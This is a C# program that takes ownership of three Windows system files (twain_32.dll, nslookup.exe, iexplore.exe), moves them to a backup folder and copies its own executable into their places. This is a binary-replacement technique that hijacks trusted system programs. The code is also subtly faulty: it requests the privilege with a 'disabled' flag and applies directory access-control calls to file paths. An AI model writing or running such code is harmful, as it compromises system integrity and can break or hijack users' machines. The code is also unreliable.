using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Runtime.InteropServices;


namespace SwapFiles
{

    class Program
    {
        sealed class UnmanagedCode
        {
            
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool CloseHandle(IntPtr hObject);

            // Use this signature if you do not want the previous state
            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool AdjustTokenPrivileges(IntPtr tokenHandle,
                [MarshalAs(UnmanagedType.Bool)]bool disableAllPrivileges,
                ref TOKEN_PRIVILEGES newState,
                UInt32 bufferLength,
                IntPtr previousState,
                IntPtr returnLength);

            [DllImport("kernel32.dll", ExactSpelling = true)]
            static extern IntPtr GetCurrentProcess();

            [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
            static extern bool OpenProcessToken
                (IntPtr processHandle, int desiredAccess, ref IntPtr phtok);

            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool LookupPrivilegeValue
                    (string host, string name, ref LUID lpLuid);

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            struct TOKEN_PRIVILEGES
            {
                public UInt32 PrivilegeCount;
                public LUID Luid;
                public UInt32 Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LUID
            {
                public uint LowPart;
                public int HighPart;
            }

            const int SE_PRIVILEGE_DISABLED = 0x00000002;
            const int TOKEN_QUERY = 0x00000008;
            const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
            //http://msdn.microsoft.com/en-us/library/bb530716(VS.85).aspx
            const string SE_RESTORE_PRIVILEGE = "SeRestorePrivilege";

            public static void GiveRestorePrivilege()
            {
                TOKEN_PRIVILEGES tokenPrivileges;
                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.Luid = new LUID();
                tokenPrivileges.Attributes = SE_PRIVILEGE_DISABLED;

                IntPtr tokenHandle = RetrieveProcessToken();

                try
                {
                    bool success = LookupPrivilegeValue
                                (null, SE_RESTORE_PRIVILEGE, ref tokenPrivileges.Luid);
                    if (success == false)
                    {
                        int lastError = Marshal.GetLastWin32Error();
                        throw new Exception(
                            string.Format("Could not find privilege {0}. Error {1}",
                                                SE_RESTORE_PRIVILEGE, lastError));
                    }

                    success = AdjustTokenPrivileges(
                                                        tokenHandle, false,
                                                        ref tokenPrivileges, 0,
                                                        IntPtr.Zero, IntPtr.Zero);
                    if (success == false)
                    {
                        int lastError = Marshal.GetLastWin32Error();
                        throw new Exception(
                            string.Format("Could not assign privilege {0}. Error {1}",
                                            SE_RESTORE_PRIVILEGE, lastError));
                    }
                }
                finally
                {
                    CloseHandle(tokenHandle);
                }

            }

            static IntPtr RetrieveProcessToken()
            {
                IntPtr processHandle = GetCurrentProcess();
                IntPtr tokenHandle = IntPtr.Zero;
                bool success = OpenProcessToken(processHandle,
                                                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                                ref tokenHandle);
                if (success == false)
                {
                    int lastError = Marshal.GetLastWin32Error();
                    throw new Exception(
                        string.Format("Could not retrieve process token. Error {0}",
                                            lastError));
                }
                return tokenHandle;
            }
        }
        //File.Replace Use this?

        // Function which swaps files
        static void Swap(string filePath, string fileName)
        {
            try
            {
                string sourceFile = Path.Combine(filePath, fileName);
                Console.WriteLine("This is our source file: " + sourceFile);
                string targetPath = @"C:\Windows\BackUp";
                string destFile = Path.Combine(targetPath, fileName);
                Console.WriteLine("This is our source file: " + destFile);
                // Create location for Backup
                Console.WriteLine(Directory.Exists(targetPath));
                if (!Directory.Exists(targetPath))
                {
                    Console.WriteLine("In If");
                    Directory.CreateDirectory(targetPath);
                }

                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                Console.WriteLine(userName);

                UnmanagedCode.GiveRestorePrivilege();

                IdentityReference owner = new NTAccount(userName);
                DirectoryInfo directory = new DirectoryInfo(sourceFile);
                DirectorySecurity directorySecurity = directory.GetAccessControl();
                directorySecurity.SetOwner(owner);
                directory.SetAccessControl(directorySecurity);


                //Move file
                File.SetAttributes(sourceFile, FileAttributes.Normal);
                File.Move(sourceFile, destFile);


                //Copy app .exe to source folder

                string currentFolder = Environment.CurrentDirectory;
                string programExe = "SwapFiles.exe";
                string exeSource = Path.Combine(currentFolder, programExe);
                string exeDest = Path.Combine(filePath, programExe);
                File.Copy(exeSource, exeDest);
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine(e.Message);
            }

            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }


        }

        static void Main(string[] args)
        {
 
            //Source of files
            string pathTwain = @"C:\Windows";
            string fileTwain = @"twain_32.dll";
            string pathNslookup = @"C:\Windows\System32";
            string fileNslookup = @"nslookup.exe";
            string pathIexplorer = @"C:\Program Files\internet explorer";
            string fileIexplorer = @"iexplore.exe";

            //Use method for move files to %ProgramFiles%\BackUp 
            //and copy .exe of program to their location
            Swap(pathTwain, fileTwain);
            Swap(pathNslookup, fileNslookup);
            Swap(pathIexplorer, fileIexplorer);

            Console.ReadKey();
        }
    }
}
